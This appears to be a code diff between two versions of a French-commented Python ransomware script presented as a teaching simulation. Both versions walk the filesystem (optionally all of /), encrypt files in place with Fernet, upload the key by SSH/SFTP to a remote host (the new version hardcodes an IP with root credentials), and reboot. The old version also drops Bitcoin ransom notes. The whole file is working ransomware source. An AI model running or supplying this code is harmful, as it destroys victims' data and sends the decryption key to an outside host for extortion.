@@ -1,293 +1,118 @@
-#!/usr/bin/env python3
-# ransomware_total.py - Simulation pédagogique complète
-# Usage: sudo python3 ransomware_total.py (UNIQUEMENT EN VM ISOLEE)
-
-import logging
-import os
-import socket
-import subprocess
-import sys
-import time
-import paramiko
 from cryptography.fernet import Fernet
+import os
+import sqlite3
+import sys
+import subprocess
+import paramiko
 
-# Configuration initiale
-LOG_FILE = "/var/log/ransomware_sim.log"
-SSH_KEY_PATH = "/tmp/encryption_key.key"
 
-# Initialisation du logging
-logging.basicConfig(
-    filename=LOG_FILE,
-    level=logging.INFO,
-    format="%(asctime)s - %(levelname)s - %(message)s"
-)
+def check_root():
+    """Vérifie si le script est exécuté en tant que root."""
+    if os.geteuid() != 0:
+        print("Ce script doit être exécuté en tant que root.")
+        sys.exit(1)
 
-class RansomwareSimulator:
-    def __init__(self):
-        self.fernet = None
-        self.key = None
-        self.ssh_config = {
-            'server': None,
-            'port': 22,
-            'user': None,
-            'password': None
-        }
 
-    def check_root(self):
-        """Vérifie les privilèges root"""
-        if os.geteuid() != 0:
-            logging.error("Le script doit être exécuté en tant que root!")
-            sys.exit(1)
+def generate_key():
+    """Génère et enregistre une clé de chiffrement."""
+    key = Fernet.generate_key()
+    with open("/root/secret.key", "wb") as key_file:
+        key_file.write(key)
+    return key
 
-    def generate_key(self):
-        """Génère une clé de chiffrement Fernet"""
-        try:
-            self.key = Fernet.generate_key()
-            with open(SSH_KEY_PATH, "wb") as key_file:
-                key_file.write(self.key)
-            self.fernet = Fernet(self.key)
-            logging.info(f"Clé générée: {SSH_KEY_PATH}")
-            print(f"\n[+] Clé générée: {SSH_KEY_PATH}")
-            return True
-        except Exception as e:
-            logging.error(f"Erreur génération clé: {str(e)}")
-            return False
 
-    def configure_ssh(self):
-        """Configure les paramètres SSH"""
-        print("\n[ Configuration SSH ]")
-        self.ssh_config['server'] = input("IP du serveur SSH: ").strip()
-        self.ssh_config['user'] = input("Utilisateur SSH: ").strip()
-        self.ssh_config['password'] = input("Mot de passe SSH: ").strip()
-        port = input("Port SSH [22]: ").strip()
-        self.ssh_config['port'] = int(port) if port else 22
+def load_key():
+    """Charge la clé de chiffrement."""
+    return open("/root/secret.key", "rb").read()
 
-    def send_key_via_ssh(self):
-        """Transmet la clé via SSH"""
-        if not self.key:
-            print("\n[!] Générer d'abord une clé")
-            return False
 
-        try:
-            # Établir la connexion SSH
-            ssh = paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(
-                hostname=self.ssh_config['server'],
-                port=self.ssh_config['port'],
-                username=self.ssh_config['user'],
-                password=self.ssh_config['password']
-            )
+def send_key_to_sftp(key):
+    """Envoie la clé de chiffrement au serveur SFTP."""
+    sftp_host = "192.168.45.79"  # Remplace avec ton hôte SFTP
+    sftp_port = 22  # Port SFTP (généralement 22)
+    sftp_username = "root"  # Nom d'utilisateur pour SFTP
+    sftp_password = "P@ssw0rd"  # Mot de passe pour SFTP
+    remote_path = "/secret.key"  # Chemin distant où la clé sera envoyée
 
-            # Créer le répertoire distant si nécessaire
-            sftp = ssh.open_sftp()
-            remote_dir = f"/home/{self.ssh_config['user']}/stolen_keys"
+    try:
+        transport = paramiko.Transport((sftp_host, sftp_port))
+        transport.connect(username=sftp_username, password=sftp_password)
+        sftp = paramiko.SFTPClient.from_transport(transport)
+        # Sauvegarde de la clé dans un fichier temporaire
+        with open("/root/secret.key", "wb") as f:
+            f.write(key)
+        # Envoi du fichier vers le serveur SFTP
+        sftp.put("/root/secret.key", remote_path)
+        sftp.close()
+        transport.close()
+        print(f"Clé envoyée à {sftp_host}:{remote_path}")
+    except Exception as e:
+        print(f"Erreur lors de l'envoi de la clé via SFTP: {e}")
+
+
+def encrypt_file(file_path, cipher):
+    """Chiffre un fichier en remplaçant son contenu."""
+    try:
+        with open(file_path, "rb") as file:
+            data = file.read()
+        encrypted_data = cipher.encrypt(data)
+        with open(file_path, "wb") as file:
+            file.write(encrypted_data)
+    except Exception as e:
+        print(f"[ERREUR] Impossible de chiffrer {file_path}: {e}")
+
+
+def decrypt_file(file_path, cipher):
+    """Déchiffre un fichier en restaurant son contenu original."""
+    try:
+        with open(file_path, "rb") as file:
+            encrypted_data = file.read()
+        decrypted_data = cipher.decrypt(encrypted_data)
+        with open(file_path, "wb") as file:
+            file.write(decrypted_data)
+    except Exception as e:
+        print(f"[ERREUR] Impossible de déchiffrer {file_path}: {e}")
+
+
+def process_directory(directory, cipher, encrypt=True):
+    """Parcourt un dossier et chiffre/déchiffre chaque fichier tout en évitant les fichiers critiques du système."""
+    system_exclude = ["/proc", "/sys", "/dev", "/run", "/tmp", "/boot", "/root/secret.key"]
+
+    for root, _, files in os.walk(directory):
+        if any(root.startswith(excl) for excl in system_exclude):
+            continue
+
+        for file in files:
+            file_path = os.path.join(root, file)
             try:
-                sftp.mkdir(remote_dir)
-            except IOError:
-                pass
-
-            # Transférer le fichier
-            remote_path = f"{remote_dir}/{socket.gethostname()}_key.key"
-            sftp.put(SSH_KEY_PATH, remote_path)
-            sftp.close()
-            ssh.close()
-
-            logging.info(f"Clé envoyée à {self.ssh_config['server']}:{remote_path}")
-            print(f"\n[+] Clé envoyée à {self.ssh_config['server']}")
-            return True
-        except Exception as e:
-            logging.error(f"Échec SSH: {str(e)}")
-            print(f"\n[!] Échec envoi: {str(e)}")
-            return False
-
-    def encrypt_file(self, filepath):
-        """Chiffre un fichier en place"""
-        try:
-            # Vérification supplémentaire pour éviter les fichiers spéciaux
-            if not os.path.isfile(filepath) or os.path.islink(filepath):
-                return False
-
-            with open(filepath, "rb") as f:
-                original = f.read()
-
-            encrypted = self.fernet.encrypt(original)
-
-            with open(filepath, "wb") as f:
-                f.write(encrypted)
-
-            return True
-        except Exception as e:
-            logging.warning(f"Erreur sur {filepath}: {str(e)}")
-            return False
-
-    def encrypt_selected_files(self):
-        """Chiffre les fichiers sélectionnés par l'utilisateur"""
-        if not self.fernet:
-            print("\n[!] Générer d'abord une clé")
-            return
-
-        print("\n[ Sélection des fichiers à chiffrer ]")
-        print("Entrez les chemins complets des fichiers (un par ligne)")
-        print("Terminez par une ligne vide")
-
-        files_to_encrypt = []
-        while True:
-            filepath = input("> ").strip()
-            if not filepath:
-                break
-            if os.path.exists(filepath):
-                files_to_encrypt.append(filepath)
-            else:
-                print(f"[!] Fichier non trouvé: {filepath}")
-
-        if not files_to_encrypt:
-            print("\n[!] Aucun fichier valide sélectionné")
-            return
-
-        print(f"\n[!] Prêt à chiffrer {len(files_to_encrypt)} fichiers")
-        confirm = input("Confirmer (o/N): ").strip().lower()
-        if confirm != 'o':
-            print("Annulé")
-            return
-
-        total = 0
-        for filepath in files_to_encrypt:
-            try:
-                if self.encrypt_file(filepath):
-                    total += 1
-                    print(f"\r[+] Fichiers chiffrés: {total}/{len(files_to_encrypt)}", end='')
+                if encrypt:
+                    encrypt_file(file_path, cipher)
+                else:
+                    decrypt_file(file_path, cipher)
+                print(f"{'Chiffré' if encrypt else 'Déchiffré'} : {file_path}")
             except Exception as e:
-                continue
+                print(f"[ERREUR] sur {file_path}: {e}")
 
-        logging.info(f"Chiffrement sélectif terminé: {total} fichiers")
-        print(f"\n\n[+] Terminé: {total} fichiers chiffrés")
 
-    def encrypt_system(self):
-        """Chiffre tous les fichiers accessibles"""
-        if not self.fernet:
-            print("\n[!] Générer d'abord une clé")
-            return
+def restart_system():
+    """Redémarre le système après chiffrement."""
+    print("Redémarrage du système dans 10 secondes...")
+    subprocess.run(["shutdown", "-r", "now"])
 
-        print("\n[!] ATTENTION: Chiffrement complet du système!")
-        confirm = input("Confirmez (tapez 'CHIFFRER'): ")
-        if confirm != "CHIFFRER":
-            print("Annulé")
-            return
-
-        exclude_dirs = {
-            '/proc', '/sys', '/dev', '/run', '/tmp',
-            '/var/run', '/var/lock', '/snap'
-        }
-
-        total = 0
-        start_time = time.time()
-
-        for root, _, files in os.walk('/'):
-            if any(root.startswith(ex) for ex in exclude_dirs):
-                continue
-
-            for file in files:
-                filepath = os.path.join(root, file)
-                try:
-                    if os.access(filepath, os.W_OK):
-                        if self.encrypt_file(filepath):
-                            total += 1
-                            if total % 100 == 0:
-                                print(f"\r[+] Fichiers chiffrés: {total}", end='')
-                except Exception as e:
-                    continue
-
-        logging.info(f"Chiffrement terminé: {total} fichiers en {time.time()-start_time:.2f}s")
-        print(f"\n\n[+] Terminé: {total} fichiers chiffrés")
-
-    def create_ransom_note(self):
-        """Crée le fichier README sur le bureau"""
-        note = f"""
-        VOS FICHIERS ONT ÉTÉ CHIFFRÉS!
-
-        Pour récupérer vos données:
-        1. Envoyez 0.5 BTC à: 1Ma1wareSimu1BitcoinAddres5
-        2. Contactez: ransomware@example.com
-        ID: {socket.gethostname()}
-        """
-
-        # Place le README sur tous les bureaux trouvés
-        created = 0
-        for root, dirs, _ in os.walk('/home'):
-            if 'Desktop' in dirs:
-                path = os.path.join(root, 'Desktop', 'README.txt')
-                try:
-                    with open(path, 'w') as f:
-                        f.write(note)
-                    created += 1
-                except:
-                    continue
-
-        # Ajoute aussi à la racine
-        try:
-            with open('/README.txt', 'w') as f:
-                f.write(note)
-            created += 1
-        except:
-            pass
-
-        print(f"\n[+] {created} notes de rançon placées")
-
-    def reboot_system(self):
-        """Redémarre le système"""
-        print("\n[!] Redémarrage en cours...")
-        logging.info("Déclenchement du redémarrage")
-        try:
-            subprocess.run(['reboot'], check=True)
-        except subprocess.CalledProcessError as e:
-            logging.error(f"Échec redémarrage: {str(e)}")
-            sys.exit(1)
-
-    def show_menu(self):
-        """Affiche le menu principal"""
-        while True:
-            print("\n" + "="*50)
-            print(" RANSOMWARE SIMULATEUR - MENU PRINCIPAL")
-            print("="*50)
-            print("1. Générer une clé de chiffrement")
-            print("2. Configurer le serveur SSH")
-            print("3. Envoyer la clé via SSH")
-            print("4. Chiffrer TOUS les fichiers (/)")
-            print("5. Chiffrer des fichiers sélectionnés")
-            print("6. Placer les notes de rançon")
-            print("7. Redémarrer le système")
-            print("0. Quitter")
-            print("="*50)
-
-            choice = input("\nVotre choix: ").strip()
-
-            if choice == "1":
-                self.generate_key()
-            elif choice == "2":
-                self.configure_ssh()
-            elif choice == "3":
-                self.send_key_via_ssh()
-            elif choice == "4":
-                self.encrypt_system()
-            elif choice == "5":
-                self.encrypt_selected_files()
-            elif choice == "6":
-                self.create_ransom_note()
-            elif choice == "7":
-                self.reboot_system()
-            elif choice == "0":
-                print("\n[+] Fermeture du programme.")
-                sys.exit(0)
-            else:
-                print("\n[!] Choix invalide")
-
-def main():
-    """Fonction principale"""
-    simulator = RansomwareSimulator()
-    simulator.check_root()
-    logging.info("=== Démarrage du simulateur ===")
-    simulator.show_menu()
 
 if __name__ == "__main__":
-    main()
+    check_root()
+    directory = input("Entrez le chemin du dossier à traiter (/ pour tout le système) : ")
+    action = input("Tapez 'E' pour chiffrer ou 'D' pour déchiffrer : ").strip().upper()
+
+    if action == 'E':
+        key = generate_key()
+        send_key_to_sftp(key)
+    else:
+        key = load_key()
+
+    cipher = Fernet(key)
+    process_directory(directory, cipher, encrypt=(action == 'E'))
+
+    if action == 'E':
+        restart_system()
